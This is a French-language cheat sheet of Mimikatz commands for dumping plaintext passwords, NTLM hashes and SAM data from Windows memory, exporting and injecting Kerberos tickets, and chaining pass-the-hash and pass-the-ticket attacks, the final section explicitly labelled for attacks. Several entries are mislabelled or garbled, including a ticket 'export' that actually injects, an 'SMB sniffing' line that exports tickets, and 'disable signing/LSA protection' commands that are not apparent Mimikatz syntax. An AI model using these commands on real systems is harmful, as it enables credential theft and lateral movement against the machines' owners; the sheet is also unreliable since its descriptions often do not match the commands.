# 🔐 **Mimikatz Cheat Sheet**

## **Commandes de base**

### 1. **Lancer Mimikatz**
```
mimikatz.exe
```

### 2. **Passer en mode Administrateur**
```
privilege::debug
```

### 3. **Afficher les mots de passe en texte clair (LSA)**
```
sekurlsa::logonpasswords
```

### 4. **Récupérer les hashes NTLM**
```
sekurlsa::ntlm
```

### 5. **Extraire les tickets Kerberos (TGT)**
```
kerberos::list
```

### 6. **Exporter les tickets Kerberos**
```
kerberos::ptt <ticket.kirbi>
```

### 7. **Dump des identifiants d'un processus spécifique (pid)**
```
sekurlsa::logonpasswords /pid <pid>
```

---

##  *Commandes avancées*

### 1. **Injection d'un ticket Kerberos dans la mémoire**
```
kerberos::ptt <ticket.kirbi>
```

### 2. **Récupérer les mots de passe des comptes locaux**
```
lsadump::sam`
```

### 3. **Dump des credentials des sessions en cours**
```
sekurlsa::logonpasswords
```

### 4.  **Dump des hashes NTLM d'un SAM local**
```
lsadump::sam
```

### 5. **Écoute du trafic SMB pour récupérer des credentials**
```
mimikatz.exe -command "kerberos::tickets /export"
```

---

##  *Commandes pour escalade de privilèges*

### 1. **Pass-the-Hash (PTH)**

Utilise un hash NTLM pour accéder à une autre machine sans avoir besoin du mot de passe en clair.
```
mimikatz.exe "sekurlsa::pth /user:<username> /domain:<domain> /rc4:<NTLM_hash> /run:<command>"
```

### 2. **Pass-the-Ticket (PTT)**

Injecte un ticket Kerberos dans la session actuelle.
```
mimikatz.exe "kerberos::ptt <ticket.kirbi>"
```

---

## *Commandes de détection / désactivation*

### 1. **Désactiver la signature SMB**
```
set/system /smbsigdisable:yes
```

### 2. **Desactiver les protections LSA (Local Security Authority)**
```
set/system /lsasignaturedisable:yes
```

---

##  *Autres options utiles*

### 1. **Débugger les processus avec privilèges**
```
privilege::debug
```

### 2. **Vérifier les permissions du fichier LSA**
```
lsadump::lsa
```

### 3. **Exporter les identifiants du processus LSASS**
```
sekurlsa::logonpasswords
```

---

##  Exemples de commandes à combiner pour des attaques

1. **Obtenir un hash NTLM puis passer ce hash pour accéder à une autre machine**
```
sekurlsa::logonpasswords sekurlsa::pth /user:Administrator /domain:DOMAIN /rc4:<NTLM_hash> /run:cmd
```

2. **Extraire et injecter un ticket Kerberos**
  ```
kerberos::list kerberos::ptt <ticket.kirbi>
```  
